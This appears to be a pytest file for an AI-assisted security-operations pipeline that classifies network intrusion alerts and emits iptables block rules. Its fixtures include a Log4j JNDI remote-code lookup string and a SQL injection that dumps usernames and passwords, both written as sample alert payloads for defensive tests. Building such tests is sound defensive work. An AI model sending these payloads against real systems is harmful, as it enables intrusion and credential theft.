import json
from unittest.mock import patch
import pytest

from app.core.state import NIDSAlert, MitigationEnvelope
from app.agents.defense import build_deterministic_fallback_envelope
from app.graph.orchestrator import (
    generate_mitigation,
    format_preference_pair,
    append_live_preference,
    soc_graph,
)


def _make_alert(
    alert_id: str,
    src_node: str,
    src_ip: str,
    dst_node: str,
    dst_ip: str,
    dport: int,
    proto: str,
    syn_ratio: float,
    ports: list[int],
    payload: str,
    signature: str,
    tactic: str,
    mitre_id: str,
    severity: str,
) -> dict:
    return {
        "alert_id": alert_id,
        "timestamp": "2026-10-18T18:00:00Z",
        "source_node": src_node,
        "source_ip": src_ip,
        "target_node": dst_node,
        "target_ip": dst_ip,
        "dest_port": dport,
        "protocol": proto,
        "flow_metrics": {
            "packet_count_2s": 250,
            "byte_count_2s": 32000,
            "syn_ratio": syn_ratio,
            "unique_dest_ports": ports,
            "payload_sample": payload,
        },
        "nids_llm_assessment": {
            "attack_signature": signature,
            "mitre_tactic": tactic,
            "mitre_technique_id": mitre_id,
            "confidence_score": 0.96,
            "severity": severity,
            "raw_telemetry_summary": f"{signature} detected from {src_node} to {dst_node}:{dport}",
        },
    }


@patch("app.agents.reviewer.generate_actor_proposal")
def test_generate_mitigation_signature_and_contract_b_output(mock_actor):
    """Verifies generate_mitigation(nids_alert: dict) -> dict returns a valid Contract B dictionary."""
    alert_dict = _make_alert(
        alert_id="evt-rce-01",
        src_node="pc-2",
        src_ip="172.28.0.12",
        dst_node="pc-4",
        dst_ip="172.28.0.14",
        dport=8080,
        proto="HTTP",
        syn_ratio=0.1,
        ports=[8080],
        payload="${jndi:ldap://172.28.0.12:1389/a}",
        signature="Log4j JNDI RCE Attempt",
        tactic="Initial Access",
        mitre_id="T1190",
        severity="CRITICAL",
    )
    mock_actor.return_value = build_deterministic_fallback_envelope(alert_dict)

    result = generate_mitigation(alert_dict)

    assert isinstance(result, dict)
    # Validate result strictly parses into Contract B MitigationEnvelope
    envelope = MitigationEnvelope.model_validate(result)
    assert envelope.threat_classification == "RCE_ATTEMPT"
    assert envelope.chosen_mitigation.action_type == "BLOCK_SOURCE_IP"
    assert envelope.chosen_mitigation.target_container == "pc-4"
    assert envelope.chosen_mitigation.source_ip == "172.28.0.12"
    assert envelope.chosen_mitigation.dest_port == 8080
    assert envelope.grpo_scoring_debug is not None
    assert envelope.grpo_scoring_debug.total_reward == 8.0


@pytest.mark.parametrize(
    "expected_class,alert_kwargs",
    [
        (
            "SYN_FLOOD",
            dict(
                alert_id="evt-syn",
                src_node="pc-1",
                src_ip="172.28.0.11",
                dst_node="pc-5",
                dst_ip="172.28.0.15",
                dport=80,
                proto="TCP",
                syn_ratio=0.95,
                ports=[80],
                payload="SYN flood",
                signature="TCP SYN Flood",
                tactic="Impact",
                mitre_id="T1498",
                severity="HIGH",
            ),
        ),
        (
            "SQL_INJECTION",
            dict(
                alert_id="evt-sqli",
                src_node="pc-3",
                src_ip="172.28.0.13",
                dst_node="pc-4",
                dst_ip="172.28.0.14",
                dport=3306,
                proto="TCP",
                syn_ratio=0.1,
                ports=[3306],
                payload="' OR 1=1 UNION SELECT username, password FROM users--",
                signature="SQL Injection Dump Attempt",
                tactic="Initial Access",
                mitre_id="T1190",
                severity="HIGH",
            ),
        ),
        (
            "SSH_BRUTE_FORCE",
            dict(
                alert_id="evt-ssh",
                src_node="pc-2",
                src_ip="172.28.0.12",
                dst_node="pc-1",
                dst_ip="172.28.0.11",
                dport=22,
                proto="TCP",
                syn_ratio=0.2,
                ports=[22],
                payload="SSH-2.0-Hydra",
                signature="SSH Brute Force",
                tactic="Credential Access",
                mitre_id="T1110",
                severity="MEDIUM",
            ),
        ),
        (
            "PORT_SCAN",
            dict(
                alert_id="evt-scan",
                src_node="pc-5",
                src_ip="172.28.0.15",
                dst_node="pc-3",
                dst_ip="172.28.0.13",
                dport=443,
                proto="TCP",
                syn_ratio=0.5,
                ports=[21, 22, 80, 443, 3306, 8080],
                payload="Nmap service probe",
                signature="Aggressive TCP Port Scan",
                tactic="Discovery",
                mitre_id="T1046",
                severity="MEDIUM",
            ),
        ),
        (
            "BENIGN",
            dict(
                alert_id="evt-benign",
                src_node="pc-1",
                src_ip="172.28.0.11",
                dst_node="pc-2",
                dst_ip="172.28.0.12",
                dport=8080,
                proto="HTTP",
                syn_ratio=0.05,
                ports=[8080],
                payload="GET /healthz HTTP/1.1",
                signature="Benign container healthcheck",
                tactic="Discovery",
                mitre_id="T1046",
                severity="LOW",
            ),
        ),
    ],
)
@patch("app.agents.reviewer.generate_actor_proposal")
def test_generate_mitigation_across_all_threat_classes(mock_actor, expected_class, alert_kwargs):
    """Verifies that all threat classes produce valid, +8.0 scored MitigationEnvelopes."""
    alert_dict = _make_alert(**alert_kwargs)
    mock_actor.return_value = build_deterministic_fallback_envelope(alert_dict)

    output = generate_mitigation(alert_dict)
    assert output["threat_classification"] == expected_class
    assert output["grpo_scoring_debug"]["total_reward"] == 8.0
    if expected_class == "BENIGN":
        assert output["chosen_mitigation"]["action_type"] == "NO_OP"
        assert output["chosen_mitigation"]["iptables_cmd"] == "# NO_OP"
    else:
        assert output["chosen_mitigation"]["iptables_cmd"].startswith("iptables -A INPUT")


@patch("app.agents.reviewer.generate_actor_proposal")
def test_live_preferences_jsonl_flywheel_logging(mock_actor, tmp_path):
    """Verifies Stage 5 preference pair logging writes valid JSONL lines with {prompt, chosen, rejected}."""
    alert_dict = _make_alert(
        alert_id="evt-flywheel-01",
        src_node="pc-2",
        src_ip="172.28.0.12",
        dst_node="pc-4",
        dst_ip="172.28.0.14",
        dport=8080,
        proto="HTTP",
        syn_ratio=0.1,
        ports=[8080],
        payload="${jndi:ldap://172.28.0.12:1389/a}",
        signature="Log4j JNDI RCE Attempt",
        tactic="Initial Access",
        mitre_id="T1190",
        severity="CRITICAL",
    )
    mock_actor.return_value = build_deterministic_fallback_envelope(alert_dict)

    jsonl_file = tmp_path / "live_preferences.jsonl"
    result = generate_mitigation(
        alert_dict,
        log_preference=True,
        preference_log_path=str(jsonl_file),
    )

    assert jsonl_file.exists()
    lines = jsonl_file.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 1

    logged_record = json.loads(lines[0])
    assert "prompt" in logged_record
    assert "chosen" in logged_record
    assert "rejected" in logged_record
    assert logged_record["metadata"]["alert_id"] == "evt-flywheel-01"
    assert logged_record["metadata"]["grpo_scoring_debug"]["total_reward"] == 8.0


def test_legacy_soc_graph_still_present():
    """Ensures backward compatibility for app/main.py and scripts/run_learning.py."""
    assert soc_graph is not None